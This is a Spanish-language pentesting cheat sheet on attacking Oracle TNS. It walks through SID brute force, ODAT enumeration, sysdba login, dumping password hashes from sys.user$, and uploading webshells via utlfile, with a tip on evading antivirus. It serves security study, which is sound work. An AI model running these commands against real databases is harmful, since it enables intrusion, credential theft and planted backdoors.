---
tags:
  - enum/service
  - OracleTNS
---
## Conceptos Clave (TL;DR)

* El servidor Oracle TNS es un protocolo que facilita la comunicación entre las aplicaciones cliente y las bases de datos Oracle a través de redes.
* Escucha por defecto las conexiones entrantes en el puerto TCP/1521, aunque puede configurarse en otros puertos y soporta diversos protocolos como TCP/IP, UDP e IPX/SPX.
* Requiere un System Identifier (SID) único para identificar la instancia específica de la base de datos a la que el cliente desea conectarse.
* La configuración depende de dos archivos de texto en el directorio `$ORACLE_HOME/network/admin`: `tnsnames.ora` (cliente, resuelve nombres a direcciones) y `listener.ora` (servidor, determina propiedades del listener).

  
## Herramientas Clave

* [Nmap](../../../📂%2008%20Herramientas&Cheatsheets/Nmap.md): Utilizado para identificar puertos expuestos, versiones del servicio y realizar ataques de fuerza bruta para adivinar el SID de la base de datos.
* **ODAT (Oracle Database Attacking Tool)**: Herramienta open-source en Python diseñada para enumerar e identificar fallos de seguridad (SQLi, RCE, escalada de privilegios) probando múltiples vectores y módulos.
* **SQLplus**: Herramienta de línea de comandos para iniciar sesión, interactuar manualmente con la base de datos y ejecutar consultas SQL.

  
## Configuraciones Inseguras

* **Contraseñas por defecto habilitadas**: Instalaciones antiguas pueden tener contraseñas predeterminadas activas (ej. `CHANGE_ON_INSTALL` en Oracle 9 o `dbsnmp` en el servicio Oracle DBSNMP).
* **Administración remota**: Por defecto, Oracle 8i/9i permite la administración remota de Oracle TNS, lo que expone el servicio a modificaciones no autorizadas.
* **Servicios vulnerables adyacentes**: Utilizar el servicio `finger` junto con Oracle incrementa el riesgo de exposición si el atacante conoce el directorio home.
* **Ausencia de listas de exclusión PL/SQL**: No disponer del archivo `PlsqlExclusionList` en el directorio `$ORACLE_HOME/sqldeveloper` permite que no haya una lista negra activa bloqueando paquetes PL/SQL peligrosos.

  
## Metodología Paso a Paso

  
### Fase 1: Escaneo y Detección

El primer paso es confirmar la presencia del servicio Oracle TNS y obtener su versión exacta para identificar la superficie de ataque potencial.


### Fase 2: Identificación del SID (Fuerza Bruta)

Sin el SID correcto, la conexión a la base de datos fallará. Se debe utilizar fuerza bruta para adivinar el System Identifier y poder establecer una conexión válida con la instancia.
 

### Fase 3: Enumeración y Búsqueda de Credenciales

Utilizando herramientas automatizadas, se lanzan módulos de enumeración masiva para interactuar con el listener bien configurado y encontrar credenciales válidas por defecto o predecibles.


### Fase 4: Acceso a la Base de Datos y Revisión de Privilegios

Una vez obtenidas unas credenciales, se realiza la conexión mediante consola para evaluar qué rol tiene asignado el usuario comprometido. Posteriormente, se intenta escalar solicitando rol de administrador de sistema (`sysdba`) para obtener control administrativo.


### Fase 5: Extracción de Hashes y Subida de Archivos

Con privilegios administrativos, se puede consultar la tabla de usuarios del sistema para dumpear los hashes de contraseñas. Alternativamente, si existe un servidor web, se intenta la subida de archivos arbitrarios (webshells) inyectando primero archivos inofensivos de texto para evadir detección.


## Cheat Sheet de Comandos
```bash
# Escaneo del puerto por defecto de Oracle TNS. Flags: -p especifica el puerto, -sV habilita la deteccion de version, --open lista solo puertos abiertos.

sudo nmap -p<PORT> -sV <TARGET_IP> --open
```

```bash
# Fuerza bruta de SID usando nmap. Flags: --script invoca el script oracle-sid-brute para intentar adivinar los identificadores.

sudo nmap -p<PORT> -sV <TARGET_IP> --open --script oracle-sid-brute
```

```bash
# Enumeracion completa con ODAT. Flags: 'all' ejecuta todos los modulos posibles, -s define la direccion del objetivo.

./odat.py all -s <TARGET_IP>
```

```bash
# Autenticacion e interaccion desde terminal. Usa el usuario, contrasena, IP y el SID encontrado.

sqlplus <USER>/<PASSWORD>@<TARGET_IP>/<SID>
```

```bash
# Iniciar sesion requiriendo especificamente privilegios maximos de base de datos.

sqlplus <USER>/<PASSWORD>@<TARGET_IP>/<SID> as sysdba
```

```sql
# [SQL] Listar todas las tablas disponibles en la base de datos actual.

select table_name from all_tables;
```

```sql
# [SQL] Verificar que privilegios tiene asignados el usuario actualmente logueado.

select * from user_role_privs;
```

```sql
# [SQL] Dumpear nombres de usuario y hashes de contrasenas (requiere privilegios SYSDBA).

select name, password from sys.user$;
```

```bash
# Subir un archivo usando ODAT. Flags: utlfile activa el modulo, -d es el SID, -U usuario, -P password, --sysdba solicita maximos privilegios, --putFile indica el path destino y archivos origen/destino.

./odat.py utlfile -s <TARGET_IP> -d <SID> -U <USER> -P <PASSWORD> --sysdba --putFile <REMOTE_PATH> <LOCAL_FILE> <REMOTE_FILENAME>
```

  

## "Gotchas" y Troubleshooting

* **Importancia del SID:** Si el cliente especifica un SID incorrecto, el intento de conexión siempre fallará. En caso de no especificarlo, se utilizará el predeterminado del archivo `tnsnames.ora`.
* **Directorios de subida de archivos:** Al subir archivos mediante `utlfile`, es obligatorio conocer exactamente el directorio raíz del servidor web. Las rutas por defecto a probar son `/var/www/html` en Linux y `C:\inetpub\wwwroot` en Windows.
* **Pruebas de subida silenciosas:** Se recomienda encarecidamente probar la subida primero con archivos `.txt` en lugar de binarios o webshells directamente para evitar disparar el Antivirus o sistemas de intrusión.
* **Error de librerías compartidas en SQLplus:** Si SQLplus falla indicando `error while loading shared libraries: libsqlplus.so: cannot open shared object file`, es porque las variables de entorno de Oracle no están registradas. Arréglarlo insertando la ruta con el siguiente comando:

```bash
sudo sh -c "echo <ORACLE_LIB_PATH> > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```